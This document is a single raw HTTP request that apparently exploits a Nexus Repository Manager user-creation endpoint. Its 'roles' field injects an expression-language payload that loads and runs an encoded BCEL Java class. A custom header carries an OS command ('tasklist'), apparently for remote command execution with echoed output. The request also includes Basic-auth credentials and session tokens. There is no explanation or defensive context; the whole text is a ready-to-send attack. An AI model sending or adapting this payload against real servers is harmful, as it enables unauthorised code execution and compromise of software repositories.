```http
POST /service/extdirect HTTP/1.1
Host: cqq.com:8081
Connection: close
NX-ANTI-CSRF-TOKEN: test
Authorization: Basic bmV4dXM6cHdyZA==
Cookie: NX-ANTI-CSRF-TOKEN=test;NXSESSIONID=cbfc0f68-0057-4c97-b87c-1f7beda5f4c5
Content-Length: 3851
cqq_command: tasklist
Content-Type: application/json

{"tid": 4, "type": "rpc", "method": "create", "data": [{"firstName": "77", "lastName": "ss", "status": "active", "userId": "shadowsock5", "email": "77@qq.com", "password": "password", "roles": ["$\\A{''.getClass().forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance().loadClass('$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$dbS$TW$Y$ff$j$S$d8e$b3$dc$W$Cn$95z$D$N$mP$ad$d2$g$acU$Q$K$r$a0$F$bc$Am$ed$S$O$Q$M$bba$b3A$ac$da$9bV$ad$b5$f6$7e$b1$f7$da$H$a6$_$9d$fa$S$9c2u$7c$e2$a1$7fB$fb$_8$d3$f7NG$fa$9d$N$B$82i$95aN$ce$f9$ee$97$dfw$ce$fe$7e$ff$d7$3b$Av$e3G$F$7e$3c$a7$c0$83$O$J$9d2$9eWP$8a$$$F$nt$8b$a5G$c6aA9$o$e3$F$J$bd2$fad$f4$L$95$a3$82zL$c6q$F$3aN$c8$Y$900$uHC$S$5eT$f0$S$5e$96qR$c6$x$S$M$Z$c32$c22F$qp$Z$a3$S$c6$U$8c$p$o$96$J$F$a7$QU$b0$R$93$SL$J$96$82jL$w$a8BL$yS$Sl$F5$o$bc$g$c4e8$e27$a1$a0$S$d3$SNK$98Q$f0$q$ce$ux$C$afJ8$cb$90$b7$_bF$9c$fd$M$9e$40$cd1$Go$ab5$c2$Z$8aB$R$93$f7$q$s$87$b9$ddo$MG$89$e2$l$e3N$_$8f$c7$y3$ce$dbmk$b2$7f$dc$e6$c6$ICA$9fc$84Ou$h1W$8e$ca$n$e1$i$a5C$99Q$g$U$3d$85$ee$86$v$5c3$c8$fb$c2$d1$r$7fJ$9f$95$b0$c3$bc$3d$o$ac$97$b5$85$c7$ad$93$c7$f9p$abe$3a$7c$c6i$980$a6$N$95J$bdG$c5y$bc$c6P$y$I$8dQ$c3$ikL$7bV$jw$T$b2$c2F4$ae$e2u$bcA$aeU$bc$89$b7T$5c$c0E$86$w$a1$d3$mt$g$faWD$abV$ed$vl$Vo$e3$SC$ae$93J$b3t$u$b4$e2$e9$f0$f0$E$P$3b$cd$M$b5$8fb$a9$aa$cdt$ec3dj$da$88$s$b8$8a$cb$b8$a2$e2$j$5ce$d8n$d9c$N$9c2$8f$c5y$c3$Ew$9c3$NqnOs$bb$a1$c3qb$94$b2In$o$96$a9$e2$5d$5cc$u$a4R$bb$8cq$838Q$ea$c6JH$adQ$pN$c9$be$87$eb$Z5IE$w$e1$7d$V$l$e0C$w$ae$db$ad$a9$E$8f$3b$M$f9$c2$k$F$ca$ed$M$9d$3e$c7$8e$98c$M$be$f0$d4$d4$c9$b059i$98TU$df$aa$3e$a7T$8f$db$RG$a8$96$ba$aa$R$ab$f1$I$e9$zS$c1$b0$3e$cdhI$8c$8er$9b$8ft$9a$b1$84C$e6$b9A$Q$fdH$c5$c7$f8D$c5$a7$f8L$c2$e7$w$be$c0$N$d1$d8$_$Z$ca$d7$ea$f5$$$F$a9$a7$Z$ab$M$a5xB$f3$x$V_$8b$aaV$acM$a5$r$R$89$ba2$df$e0$5b$G$a6$a8$f8$OWU$7c$8f$l$Y6$ad$IwF$a3$7c$cc$88$k$M$87y$3c$de6$T$e61Q$fbt$7e$ae$c82U$c5$d3$C$827$b1$87$ba$b0$G$a3$Z$R$d8$7c4J$jhl$8f$f0$a8$98$8ap$c2$b6$b9$e9$a4$b1Z$W$a8$J$adE0$e1$aa$98$ca$7b$88$80aP$f2K$9a$f5$81$d0$da$bc$9aW$ebf8$o$T$Fq$ee$a4R$89$b8$A$f6$G$G$c5$i$7b$c82$c3$b6$c0$83h$ae$c9$Gpi$d4$b2$7b$8cI$d2$af$7e$88$7f$X$80$a4$n$93$DwO$85$Ld$T$90H$me23$f9$r$9bt$f3$Q$3eir$e9j$c9$W$e5$60$K$7c$dd$dc$Z$b7$a8$y$H$b2$845$f4$80$d7l$85JY$m$7f$eb$fe$8bG$a1D$cci$eb$U$85$ba7K$uYn$84$ac5$yY$a1$f5$sL$t$oRw$e70$7d$f0g$d4a$89L$8a$5e$3e$c3$c3tK$3c$a4$f2GlK$b49$d3$d3$S1ui$ac$g$X$Cg$da$5b$e6$i$89B$E$b22$ElJWX$a9$81s$a9$b2$7b$cd$d1$8b$40$952b1n$3e$CN3FR$e0$c5$b1$d2$X$8e$U$T$XH$d4$5c$d3$f9$b4$RrX$e4J$b8$_K$bfm$8496$d3$a3$e5$87$f8$f3$d0$85C$cf$C$adMt$aa$a4_$ba$83$90$5b$3b$Hv$L$e26z$8a$d6$3c$97$a8$m_$8coJ4$e7$kQ$d7$91$c0$95$db$c8$e9$d2$3c$9a7$89$dcP$j$adyu$b5IH$dd$9a$7c$h$f9$3d$f5$9aB$f4$a0W$f7$K$8e$ee$ddA$ac$bb$f0$d1$7f0WSI$o$98$a7$e7i$FBF$d2$rW$s7$u$eb$f2$9d$a6$7cO$93$e2W$fc$f97Y$95$$$fb$95$5dA$9f$ee$5b$60$9a$$$e9$3e$b2$RTuu$B$8b$ba$9aDa$SEZq$S$r7$f0$97$7b$O$W$e8$F$9a$e6$f9$N$a5I$94$e9$wm$fcI$94$H$L$f5B$c1$y$d2$8b$b4$8a4$b30$cd$y$d6$c9B$a1$b6$ceK$8c$B$8f$a6$f7$Jn1$9d$fctz$8cN$e5w$a1$HKHw$fd$D$ba$9a$ae$J$dd$Ni$86$b6$c4$b8$8b$ca$60$a9$f6x$b0l$k$h$Hnc$93$5e$92$c4$e6$q$b6$ccak$d0$3f$8f$aa$81yT$P$e8$fe9l$9b$c3$f6$60$b9$5e$9eD$60$mX$b1$80$cd$f3$a8$Z$98C$ad$5e$96D$9d$5eA$8bFu$abK$a2$3eX6$bb$f8$87$5e$w$Y$N$b3T3$f5$a2$c2f$ef$ff9$Lo$d7$z$e4$c0d3$ec$y$g$a9$x$X$d8$r$fa$q$c9q$bbw$j$5bi$z$87$97$fa$a5$d2$97R$J6$a0$82$bew$w$J$G$d5$d8$82$3a$fa$cc$d9$8b$ed8$40_6$9d$a8$c5a$ec$40$E$f50$c9$d2i$b2r$O$3bq$N$bb$e8$d9$d9$8d$9f$a8$ff$bf$90$d5$F$d2$b8$87f$96$83$83$ecq$ib$5b$d0$c6$9a$d0$ce$3a$d0$c1$fa$d0$c9$a6$Qb38J$d1$f4$b1$f3$d8$c1$$$60$90$o$3a$c1$$c$884$81$9f$91$bfH$5b$9f$84$a0$84f$J$fb$q$3c$e3n$7c$cb$hF$98$5b$q$t$V$ff$x$e3$92S$9c$e5u$bf$bb$3e$ebn$OH8$I$fc$83$A$9d$W$J$b2$ea$c3$ac$B$z$SZ$fe$G$5bD$ae$Y$Q$3a$b5$C2$O$z$PI$e7$d2$90$Q$7cw$ceB$ee$o$b8$ef$ba$e5R$3c$e4$m$5d$f5rW$bd$80h$c5D$z$84$84$o$f8$a8$f6$o$7b$J9$edd$d6KJmt$ccA$fb$bf$b5m$a4$a8$M$L$A$A').newInstance()}"]}], "action": "coreui_User"}
```